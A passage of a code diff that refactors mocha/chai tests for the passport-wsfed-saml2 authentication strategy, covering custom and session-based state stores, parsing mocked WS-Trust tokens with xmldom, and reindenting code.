expect    = require('chai').expect;\n+const passport  = require('chai-passport-strategy');\n+const Strategy  = require('../../lib/passport-wsfed-saml2').Strategy;\n+\n+const xmldom = require('@xmldom/xmldom');\n+const domParser = new xmldom.DOMParser();\n+\n \n chai.use(passport);\n \n describe('wsfed - using custom session state store', function() {\n-  \n+\n   describe('that accepts meta argument', function() {\n     function CustomStore() {}\n \n     CustomStore.prototype.store = function(req, meta, cb) {\n       if (req.url === '/error') { return cb(new Error('something went wrong storing state')); }\n       if (req.url === '/exception') { throw new Error('something went horribly wrong storing state'); }\n-      \n+\n       if (req.url !== '/me') { return cb(new Error('incorrect req argument')); }\n       if (meta.identityProviderUrl !== 'http://www.example.com/login') { return cb(new Error('incorrect meta.identityProviderUrl argument')); }\n-      \n+\n       req.customStoreStoreCalled = req.customStoreStoreCalled ? req.customStoreStoreCalled++ : 1;\n       return cb(null, 'foos7473');\n     };\n-    \n+\n     CustomStore.prototype.verify = function(req, state, meta, cb) {\n       if (req.url === '/error') { return cb(new Error('something went wrong verifying state')); }\n       if (req.url === '/exception') { throw new Error('something went horribly wrong verifying state'); }\n-      \n+\n       if (state !== 'foos7473') { return cb(new Error('incorrect state argument')); }\n       if (meta.identityProviderUrl !== 'http://www.example.com/login') { return cb(new Error('incorrect meta.identityProviderUrl argument')); }\n-      \n+\n       req.customStoreVerifyCalled = req.customStoreVerifyCalled ? req.customStoreVerifyCalled++ : 1;\n       return cb(null, true);\n     };\n-    \n+\n     describe('issuing authorization request', function() {\n       var strategy = new Strategy({\n-        path: '/callback',\n-        realm: 'urn:fixture-test',\n-        identityProviderUrl: 'http://www.example.com/login',\n-        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-        store: new CustomStore()\n-      },\n-      function() {});\n-      \n+            path: '/callback',\n+            realm: 'urn:fixture-test',\n+            identityProviderUrl: 'http://www.example.com/login',\n+            thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+            store: new CustomStore()\n+          },\n+          function() {});\n+\n       describe('that redirects to service provider', function() {\n         var request, url;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .redirect(function(u) {\n-              url = u;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-              req.url = '/me';\n-            })\n-            .authenticate({});\n+              .redirect(function(u) {\n+                url = u;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+                req.url = '/me';\n+              })\n+              .authenticate({});\n         });\n-  \n+\n         it('should be redirected', function() {\n           expect(url).to.equal('http://www.example.com/login?wctx=foos7473&wtrealm=urn%3Afixture-test&wa=wsignin1.0&whr=');\n         });\n-      \n+\n         it('should serialize state using custom store', function() {\n           expect(request.customStoreStoreCalled).to.equal(1);\n         });\n       });\n-      \n+\n       describe('that errors due to custom store supplying error', function() {\n         var request, err;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .error(function(e) {\n-              err = e;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-              req.url = '/error';\n-            })\n-            .authenticate({});\n+              .error(function(e) {\n+                err = e;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+                req.url = '/error';\n+              })\n+              .authenticate({});\n         });\n-  \n+\n         it('should error', function() {\n           expect(err).to.be.an.instanceof(Error);\n           expect(err.message).to.equal('something went wrong storing state');\n         });\n       });\n-      \n+\n       describe('that errors due to custom store throwing error', function() {\n         var request, err;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .error(function(e) {\n-              err = e;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-              req.url = '/exception';\n-            })\n-            .authenticate({});\n+              .error(function(e) {\n+                err = e;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+                req.url = '/exception';\n+              })\n+              .authenticate({});\n         });\n-  \n+\n         it('should error', function() {\n           expect(err).to.be.an.instanceof(Error);\n           expect(err.message).to.equal('something went horribly wrong storing state');\n         });\n       });\n     });\n-    \n+\n     describe('processing response to authorization request', function() {\n       var strategy = new Strategy({\n-        path: '/callback',\n-        realm: 'urn:fixture-test',\n-        identityProviderUrl: 'http://www.example.com/login',\n-        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-        store: new CustomStore()\n-      },\n-      function (profile, done) {\n-        return done(null, profile, { message: 'Hello' });\n-      });\n+            path: '/callback',\n+            realm: 'urn:fixture-test',\n+            identityProviderUrl: 'http://www.example.com/login',\n+            thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+            store: new CustomStore()\n+          },\n+          function (profile, done) {\n+            return done(null, profile, { message: 'Hello' });\n+          });\n \n       strategy._wsfed.extractToken = function(req) {\n         expect(req).to.be.an('object');\n-        return '<trust:RequestedSecurityToken>...</trust:RequestedSecurityToken>';\n+        return domParser.parseFromString('<trust:RequestedSecurityToken xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestedSecurityToken>', 'text/xml');\n       };\n \n-      strategy._saml.validateSamlAssertion = function(token, done) {\n-        expect(token).to.equal('<trust:RequestedSecurityToken>...</trust:RequestedSecurityToken>');\n+      strategy._saml.validateSamlAssertion = function(wResult, _options, done) {\n+        expect(wResult).to.equal('<trust:RequestSecurityTokenResponseCollection xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestSecurityTokenResponseCollection>');\n         done(null, { id: '1234' });\n       };\n-      \n+\n       describe('that was approved', function() {\n         var request, user, info;\n \n         before(function (done) {\n           chai.passport.use(strategy)\n-            .success(function(u, i) {\n-              user = u;\n-              info = i;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-          \n-              req.url = '/login';\n-              req.body = {};\n-              req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n-              req.body.wctx = 'foos7473';\n-              req.method = 'POST';\n-              req.get = function(){\n-                return '';\n-              };\n-            })\n-            .authenticate({});\n+              .success(function(u, i) {\n+                user = u;\n+                info = i;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.url = '/login';\n+                req.body = {};\n+                req.body.wresult = '<trust:RequestSecurityTokenResponseCollection xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestSecurityTokenResponseCollection>';\n+                req.body.wctx = 'foos7473';\n+                req.method = 'POST';\n+                req.get = function(){\n+                  return '';\n+                };\n+              })\n+              .authenticate({});\n         });\n \n         it('should supply user', function() {\n\n@@ -168,58 +172,58 @@\ndescribe('wsfed - using custom session state store', function() {\n           expect(info).to.be.an('object');\n           expect(info.message).to.equal('Hello');\n         });\n-    \n+\n         it('should verify state using custom store', function() {\n           expect(request.customStoreVerifyCalled).to.equal(1);\n         });\n       });\n-      \n+\n       describe('that errors due to custom store supplying error', function() {\n         var request, err;\n \n         before(function (done) {\n           chai.passport.use(strategy)\n-            .error(function(e) {\n-              err = e;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-          \n-              req.url = '/error';\n-              req.body = {};\n-              req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n-              req.body.wctx = 'foos7473';\n-              req.method = 'POST';\n-            })\n-            .authenticate({});\n+              .error(function(e) {\n+                err = e;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.url = '/error';\n+                req.body = {};\n+                req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n+                req.body.wctx = 'foos7473';\n+                req.method = 'POST';\n+              })\n+              .authenticate({});\n         });\n \n         it('should error', function() {\n           expect(err).to.be.an.instanceof(Error);\n           expect(err.message).to.equal('something went wrong verifying state');\n         });\n       });\n-      \n+\n       describe('that errors due to custom store throwing error', function() {\n         var request, err;\n \n         before(function (done) {\n           chai.passport.use(strategy)\n-            .error(function(e) {\n-              err = e;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-          \n-              req.url = '/exception';\n-              req.body = {};\n-              req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n-              req.body.wctx = 'foos7473';\n-              req.method = 'POST';\n-            })\n-            .authenticate({});\n+              .error(function(e) {\n+                err = e;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.url = '/exception';\n+                req.body = {};\n+                req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n+                req.body.wctx = 'foos7473';\n+                req.method = 'POST';\n+              })\n+              .authenticate({});\n         });\n \n         it('should error', function() {\n\n@@ -229,61 +233,61 @@\ndescribe('wsfed - using custom session state store', function() {\n       });\n     });\n   });\n-  \n+\n   describe('that accepts meta argument and supplies state', function() {\n     function CustomStore() {}\n-    \n+\n     CustomStore.prototype.verify = function(req, state, meta, cb) {\n       req.customStoreVerifyCalled = req.customStoreVerifyCalled ? req.customStoreVerifyCalled++ : 1;\n       return cb(null, true, { returnTo: 'http://www.example.com/' });\n     };\n-    \n+\n     describe('processing response to authorization request', function() {\n-      \n+\n       describe('that was approved without info', function() {\n         var strategy = new Strategy({\n-          path: '/callback',\n-          realm: 'urn:fixture-test',\n-          identityProviderUrl: 'http://www.example.com/login',\n-          thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-          store: new CustomStore()\n-        },\n-        function (profile, done) {\n-          return done(null, profile);\n-        });\n+              path: '/callback',\n+              realm: 'urn:fixture-test',\n+              identityProviderUrl: 'http://www.example.com/login',\n+              thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+              store: new CustomStore()\n+            },\n+            function (profile, done) {\n+              return done(null, profile);\n+            });\n \n         strategy._wsfed.extractToken = function(req) {\n           expect(req).to.be.an('object');\n-          return '<trust:RequestedSecurityToken>...</trust:RequestedSecurityToken>';\n+          return domParser.parseFromString('<trust:RequestedSecurityToken xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestedSecurityToken>', 'text/xml');\n         };\n \n-        strategy._saml.validateSamlAssertion = function(token, done) {\n-          expect(token).to.equal('<trust:RequestedSecurityToken>...</trust:RequestedSecurityToken>');\n+        strategy._saml.validateSamlAssertion = function(token, _options, done) {\n+          expect(token).to.equal('<trust:RequestSecurityTokenResponseCollection xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestSecurityTokenResponseCollection>');\n           done(null, { id: '1234' });\n         };\n-        \n+\n         var request, user, info;\n \n         before(function (done) {\n           chai.passport.use(strategy)\n-            .success(function(u, i) {\n-              user = u;\n-              info = i;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-        \n-              req.url = '/login';\n-              req.body = {};\n-              req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n-              req.body.wctx = 'foos7473';\n-              req.method = 'POST';\n-              req.get = function(){\n-                return '';\n-              };\n-            })\n-            .authenticate({});\n+              .success(function(u, i) {\n+                user = u;\n+                info = i;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.url = '/login';\n+                req.body = {};\n+                req.body.wresult = '<trust:RequestSecurityTokenResponseCollection xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestSecurityTokenResponseCollection>';\n+                req.body.wctx = 'foos7473';\n+                req.method = 'POST';\n+                req.get = function(){\n+                  return '';\n+                };\n+              })\n+              .authenticate({});\n         });\n \n         it('should supply user', function() {\n\n@@ -297,56 +301,56 @@\ndescribe('wsfed - using custom session state store', function() {\n           expect(info.state).to.be.an('object');\n           expect(info.state.returnTo).to.equal('http://www.example.com/');\n         });\n-  \n+\n         it('should verify state using custom store', function() {\n           expect(request.customStoreVerifyCalled).to.equal(1);\n         });\n       });\n-      \n+\n       describe('that was approved with info', function() {\n         var strategy = new Strategy({\n-          path: '/callback',\n-          realm: 'urn:fixture-test',\n-          identityProviderUrl: 'http://www.example.com/login',\n-          thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-          store: new CustomStore()\n-        },\n-        function (profile, done) {\n-          return done(null, profile, { message: 'Hello' });\n-        });\n+              path: '/callback',\n+              realm: 'urn:fixture-test',\n+              identityProviderUrl: 'http://www.example.com/login',\n+              thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+              store: new CustomStore()\n+            },\n+            function (profile, done) {\n+              return done(null, profile, { message: 'Hello' });\n+            });\n \n         strategy._wsfed.extractToken = function(req) {\n           expect(req).to.be.an('object');\n-          return '<trust:RequestedSecurityToken>...</trust:RequestedSecurityToken>';\n+          return domParser.parseFromString('<trust:RequestedSecurityToken xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestedSecurityToken>', 'text/xml');\n         };\n \n-        strategy._saml.validateSamlAssertion = function(token, done) {\n-          expect(token).to.equal('<trust:RequestedSecurityToken>...</trust:RequestedSecurityToken>');\n+        strategy._saml.validateSamlAssertion = function(token, _options, done) {\n+          expect(token).to.equal('<trust:RequestSecurityTokenResponseCollection xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestSecurityTokenResponseCollection>');\n           done(null, { id: '1234' });\n         };\n \n         var request, user, info;\n \n         before(function (done) {\n           chai.passport.use(strategy)\n-            .success(function(u, i) {\n-              user = u;\n-              info = i;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-        \n-              req.url = '/login';\n-              req.body = {};\n-              req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n-              req.body.wctx = 'foos7473';\n-              req.method = 'POST';\n-              req.get = function(){\n-                return '';\n-              };\n-            })\n-            .authenticate({});\n+              .success(function(u, i) {\n+                user = u;\n+                info = i;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.url = '/login';\n+                req.body = {};\n+                req.body.wresult = '<trust:RequestSecurityTokenResponseCollection xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestSecurityTokenResponseCollection>';\n+                req.body.wctx = 'foos7473';\n+                req.method = 'POST';\n+                req.get = function(){\n+                  return '';\n+                };\n+              })\n+              .authenticate({});\n         });\n \n         it('should supply user', function() {\n\n@@ -361,11 +365,11 @@\ndescribe('wsfed - using custom session state store', function() {\n           expect(info.state).to.be.an('object');\n           expect(info.state.returnTo).to.equal('http://www.example.com/');\n         });\n-  \n+\n         it('should verify state using custom store', function() {\n           expect(request.customStoreVerifyCalled).to.equal(1);\n         });\n       });\n     });\n   });\n-});\n+});\n\\ No newline at end of file\n```\n\nFilename: test/state/wsfed.state.session.tests.js:\n```\n@@ -1,15 +1,19 @@\n-var chai      = require('chai');\n-var uri       = require('url');\n-var expect    = require('chai').expect;\n-var passport  = require('chai-passport-strategy');\n-var Strategy  = require('../../lib/passport-wsfed-saml2').Strategy;\n+const chai      = require('chai');\n+const uri       = require('url');\n+const expect    = require('chai').expect;\n+const passport  = require('chai-passport-strategy');\n+const Strategy  = require('../../lib/passport-wsfed-saml2').Strategy;\n+\n+const xmldom = require('@xmldom/xmldom');\n+const domParser = new xmldom.DOMParser();\n+\n \n chai.use(passport);\n \n describe('wsfed - using default session state store', function() {\n-  \n+\n   describe('without session key option', function() {\n-    \n+\n     describe('issuing authorization request', function() {\n       var strategy = new Strategy({\n         path: '/callback',\n\n@@ -18,429 +22,429 @@\ndescribe('wsfed - using default session state store', function() {\n         thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n         state: true\n       }, function () {});\n-      \n+\n       describe('that redirects to service provider', function() {\n         var request, url;\n-  \n+\n         before(function(done) {\n           chai.passport.use(strategy)\n-            .redirect(function(u) {\n-              url = u;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-              req.session = {};\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .redirect(function(u) {\n+                url = u;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+                req.session = {};\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should be redirected', function() {\n           var u = uri.parse(url, true);\n           expect(u.query.wctx).to.have.length(24);\n         });\n-      \n+\n         it('should save state in session', function() {\n           var u = uri.parse(url, true);\n           expect(request.session['wsfed:www.example.com'].state).to.have.length(24);\n           expect(request.session['wsfed:www.example.com'].state).to.equal(u.query.wctx);\n         });\n       });\n-      \n+\n       describe('that redirects to service provider with other data in session', function() {\n         var request, url;\n-  \n+\n         before(function(done) {\n           chai.passport.use(strategy)\n-            .redirect(function(u) {\n-              url = u;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-              req.session = {};\n-              req.session['wsfed:www.example.com'] = {};\n-              req.session['wsfed:www.example.com'].foo = 'bar';\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .redirect(function(u) {\n+                url = u;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+                req.session = {};\n+                req.session['wsfed:www.example.com'] = {};\n+                req.session['wsfed:www.example.com'].foo = 'bar';\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should be redirected', function() {\n           var u = uri.parse(url, true);\n           expect(u.query.wctx).to.have.length(24);\n         });\n-      \n+\n         it('should save state in session', function() {\n           var u = uri.parse(url, true);\n-        \n+\n           expect(request.session['wsfed:www.example.com'].state).to.have.length(24);\n           expect(request.session['wsfed:www.example.com'].state).to.equal(u.query.wctx);\n         });\n-        \n+\n         it('should preserve other data in session', function() {\n           expect(request.session['wsfed:www.example.com'].foo).to.equal('bar');\n         });\n       });\n-      \n+\n       describe('that errors due to lack of session support in app', function() {\n         var request, err;\n-  \n+\n         before(function(done) {\n           chai.passport.use(strategy)\n-            .error(function(e) {\n-              err = e;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .error(function(e) {\n+                err = e;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should error', function() {\n           expect(err).to.be.an.instanceof(Error);\n           expect(err.message).to.equal('Authentication requires session support when using state. Did you forget to use express-session middleware?');\n         });\n       });\n     });\n-    \n+\n     describe('processing response to authorization request', function() {\n       var strategy = new Strategy({\n-        path: '/callback',\n-        realm: 'urn:fixture-test',\n-        identityProviderUrl: 'http://www.example.com/login',\n-        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-        state: true\n-      },\n-      function (profile, done) {\n-        return done(null, profile, { message: 'Hello' });\n-      });\n+            path: '/callback',\n+            realm: 'urn:fixture-test',\n+            identityProviderUrl: 'http://www.example.com/login',\n+            thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+            state: true\n+          },\n+          function (profile, done) {\n+            return done(null, profile, { message: 'Hello' });\n+          });\n \n       strategy._wsfed.extractToken = function(req) {\n         expect(req).to.be.an('object');\n-        return '<trust:RequestedSecurityToken>...</trust:RequestedSecurityToken>';\n+        return domParser.parseFromString('<trust:RequestedSecurityToken xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestedSecurityToken>', 'text/xml');\n       };\n \n-      strategy._saml.validateSamlAssertion = function(token, done) {\n-        expect(token).to.equal('<trust:RequestedSecurityToken>...</trust:RequestedSecurityToken>');\n+      strategy._saml.validateSamlAssertion = function(token, _options, done) {\n+        expect(token).to.equal('<trust:RequestSecurityTokenResponseCollection xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestSecurityTokenResponseCollection>');\n         done(null, { id: '1234' });\n       };\n-      \n+\n       describe('that was approved', function() {\n         var request, user, info;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .success(function(u, i) {\n-              user = u;\n-              info = i;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n-              req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.method = 'POST';\n-              req.session = {};\n-              req.session['wsfed:www.example.com'] = {};\n-              req.session['wsfed:www.example.com']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.get = function(){\n-                return '';\n-              };\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .success(function(u, i) {\n+                user = u;\n+                info = i;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.wresult = '<trust:RequestSecurityTokenResponseCollection xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestSecurityTokenResponseCollection>';\n+                req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.method = 'POST';\n+                req.session = {};\n+                req.session['wsfed:www.example.com'] = {};\n+                req.session['wsfed:www.example.com']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.get = function(){\n+                  return '';\n+                };\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should supply user', function() {\n           expect(user).to.be.an('object');\n           expect(user.id).to.equal('1234');\n         });\n-  \n+\n         it('should supply info', function() {\n           expect(info).to.be.an('object');\n           expect(info.message).to.equal('Hello');\n         });\n-      \n+\n         it('should remove state from session', function() {\n           expect(request.session['wsfed:www.example.com']).to.be.undefined;\n         });\n       });\n-      \n+\n       describe('that was approved with other data in the session', function() {\n         var request, user, info;\n-  \n+\n         before(function(done) {\n           chai.passport.use(strategy)\n-            .success(function(u, i) {\n-              user = u;\n-              info = i;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n-              req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.method = 'POST';\n-              req.session = {};\n-              req.session['wsfed:www.example.com'] = {};\n-              req.session['wsfed:www.example.com']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.session['wsfed:www.example.com'].foo = 'bar';\n-              req.get = function(){\n-                return '';\n-              };\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .success(function(u, i) {\n+                user = u;\n+                info = i;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.wresult = '<trust:RequestSecurityTokenResponseCollection xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestSecurityTokenResponseCollection>';\n+                req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.method = 'POST';\n+                req.session = {};\n+                req.session['wsfed:www.example.com'] = {};\n+                req.session['wsfed:www.example.com']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.session['wsfed:www.example.com'].foo = 'bar';\n+                req.get = function(){\n+                  return '';\n+                };\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should supply user', function() {\n           expect(user).to.be.an('object');\n           expect(user.id).to.equal('1234');\n         });\n-  \n+\n         it('should supply info', function() {\n           expect(info).to.be.an('object');\n           expect(info.message).to.equal('Hello');\n         });\n-      \n+\n         it('should preserve other data from session', function() {\n           expect(request.session['wsfed:www.example.com'].state).to.be.undefined;\n           expect(request.session['wsfed:www.example.com'].foo).to.equal('bar');\n         });\n       });\n-      \n+\n       describe('that fails due to state being invalid', function() {\n         var request, info, status;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .fail(function(i, s) {\n-              info = i;\n-              status = s;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n-              req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK-WRONG';\n-              req.method = 'POST';\n-              req.session = {};\n-              req.session['wsfed:www.example.com'] = {};\n-              req.session['wsfed:www.example.com']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .fail(function(i, s) {\n+                info = i;\n+                status = s;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.wresult = '<trust:RequestSecurityTokenResponseCollection xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestSecurityTokenResponseCollection>';\n+                req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK-WRONG';\n+                req.method = 'POST';\n+                req.session = {};\n+                req.session['wsfed:www.example.com'] = {};\n+                req.session['wsfed:www.example.com']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should supply info', function() {\n           expect(info).to.be.an('object');\n           expect(info.message).to.equal('Invalid authorization request state.');\n         });\n-      \n+\n         it('should supply status', function() {\n           expect(status).to.equal(403);\n         });\n-      \n+\n         it('should remove state from session', function() {\n           expect(request.session['wsfed:www.example.com']).to.be.undefined;\n         });\n       });\n-      \n+\n       describe('that fails due to provider-specific state not found in session', function() {\n         var request, info, status;\n-  \n+\n         before(function(done) {\n           chai.passport.use(strategy)\n-            .fail(function(i, s) {\n-              info = i;\n-              status = s;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n-              req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK-WRONG';\n-              req.method = 'POST';\n-              req.session = {};\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .fail(function(i, s) {\n+                info = i;\n+                status = s;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n+                req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK-WRONG';\n+                req.method = 'POST';\n+                req.session = {};\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should supply info', function() {\n           expect(info).to.be.an('object');\n           expect(info.message).to.equal('Unable to verify authorization request state.');\n         });\n-      \n+\n         it('should supply status', function() {\n           expect(status).to.equal(403);\n         });\n       });\n-      \n+\n       describe('that fails due to provider-specific state lacking state value', function() {\n         var request, info, status;\n-  \n+\n         before(function(done) {\n           chai.passport.use(strategy)\n-            .fail(function(i, s) {\n-              info = i;\n-              status = s;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n-              req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK-WRONG';\n-              req.method = 'POST';\n-              req.session = {};\n-              req.session['wsfed:www.example.com'] = {};\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .fail(function(i, s) {\n+                info = i;\n+                status = s;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n+                req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK-WRONG';\n+                req.method = 'POST';\n+                req.session = {};\n+                req.session['wsfed:www.example.com'] = {};\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should supply info', function() {\n           expect(info).to.be.an('object');\n           expect(info.message).to.equal('Unable to verify authorization request state.');\n         });\n-      \n+\n         it('should supply status', function() {\n           expect(status).to.equal(403);\n         });\n       });\n-      \n+\n       describe('that errors due to lack of session support in app', function() {\n         var request, err;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .error(function(e) {\n-              err = e;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n-              req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK-WRONG';\n-              req.method = 'POST';\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .error(function(e) {\n+                err = e;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n+                req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK-WRONG';\n+                req.method = 'POST';\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should error', function() {\n           expect(err).to.be.an.instanceof(Error);\n           expect(err.message).to.equal('Authentication requires session support when using state. Did you forget to use express-session middleware?');\n         });\n       });\n     });\n   });\n-  \n+\n   describe('with session key option', function() {\n     var strategy = new Strategy({\n-      path: '/callback',\n-      realm: 'urn:fixture-test',\n-      identityProviderUrl: 'http://www.example.com/login',\n-      thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-      state: true,\n-      sessionKey: 'wsfed:example'\n-    },\n-    function (profile, done) {\n-      return done(null, profile, { message: 'Hello' });\n-    });\n+          path: '/callback',\n+          realm: 'urn:fixture-test',\n+          identityProviderUrl: 'http://www.example.com/login',\n+          thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+          state: true,\n+          sessionKey: 'wsfed:example'\n+        },\n+        function (profile, done) {\n+          return done(null, profile, { message: 'Hello' });\n+        });\n \n     strategy._wsfed.extractToken = function(req) {\n       expect(req).to.be.an('object');\n-      return 